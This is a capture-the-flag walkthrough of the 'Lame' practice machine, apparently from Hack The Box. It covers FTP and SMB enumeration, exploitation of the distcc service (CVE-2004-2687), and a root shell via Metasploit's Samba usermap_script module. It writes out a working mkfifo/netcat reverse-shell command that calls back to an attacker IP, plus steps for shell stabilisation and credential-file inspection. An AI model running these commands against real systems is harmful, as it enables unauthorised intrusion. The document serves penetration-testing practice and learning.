# LAME

Nmap scan tells that 21/tcp is open we try to log as *anonymous* and we succeed but there is nothing interesting in there.

We try to vulenrate vsftpd 2.4.8 with metasploit but no session could be created so we move on.


## Unauth enum

* `sudo nmap -sV -p21 -sC -A 10.10.10.10`

Nothing relevant we move on.


## Brute force

* `sudon map --script ftp-* -p 21 10.10.10.3`

We receive 500 ilegal port command and it hangs so nothing to look for.

* Download files

`wget -m --no-passive ftp://anonymous:anonymous@10.10.10.3 `

We get the files but nothing relevant.


## PORT 139/TCP NETBIOS-SSN SAMBA

Since 21/tcp didn't provide anything interesting we proceed to look the other ports, we see that 22/tcp ssh is open but we don't find anything relevant.

After that we found that *139/tcp* was open so we proceed with possible vulnerabilities

[137-138-139-pentesting-netbios](https://book.hacktricks.xyz/v/es/network-services-pentesting/137-138-139-pentesting-netbios)

* └─$ nmblookup -A 10.10.10.3 *nothing*
* └─$ nbtscan 10.10.10.3/30 *nothing*
* sudo nmap -sU -sV -T4 --script nbstat.nse -p139 -Pn -n 10.10.10.3 *closed*

* └─$ nbtscan 10.10.10.3/24  we found that *LEGACY* as a netbios_name but the user is unknown

*Nothing relevant we move on*

## Port 3632 | distcc

[3632-pentesting-distcc](https://book.hacktricks.xyz/network-services-pentesting/3632-pentesting-distcc)

* msf5 > use exploit/unix/misc/distcc_exec | a metasploit command so we try to make it work.

Finally we found out that **CVE-2004-2687** is a possible vulnerability since we can execute commands from shell using the exploit

[CVE-2004-2687](https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855)

* `python exploit.py -t 10.10.10.3 -p 3632 -c 'whoami'` we get *daemon*

So we proceed the exploitation doing a reverse shell command and listen to it with netcat

```
# We listen for any command
nc -lvnp 4444 

# So we me make the Reverse Shell Command
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 0.0.0.0 4444 >/tmp/f


# script

python exploit.py -t 10.10.10.3 -p 3632 -c 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.16.8 4444 >/tmp/f'

# we succeed on the explotation and we got acces to the machine

```

There is a small issue with the machine, the connection expires so we use nohup to mantain conection

`
nohup python exploit.py -t 10.10.10.3 -p 3632 -c 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.16.8 4444 >/tmp/f' &
`

## Making the Terminal Interactive

To be able to use it like a normal linux terminal (ctrl + c, etc) we do the next

* `script /dev/null -c bash`
* CTRL + Z
* `stty raw -echo; fg`
* `reset xterm`

On our linux machine we take a look at the `stty` size

* stty size

On the target machine we do 

* `stty rows 50 columns 102` Values come from your *stty size*

Then we get info of the system

* `lsb_release -a`

## Elevating privilages

We try to check for the root user

* `su root` Auth failed
* `strings /bin/stock | grep -i "password"`

We find that with `uname -a` we are running on *Linux lame 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux*

* cat /etc/passwd
* ls -la /etc/passwd
> x means the password is encrypte
* ls -la /etc/shadow

[Privilege Escalation](https://delinea.com/blog/linux-privilege-escalation)


## Metasploit | multi/samba/usermap_script 

Using this script we set the *RHOST* to the Target IP and LHOST to our vpn_ip/local_ip and we get a root access,

* `whoami` -> root
* `cd /root` > `cat root.txt`

We got it!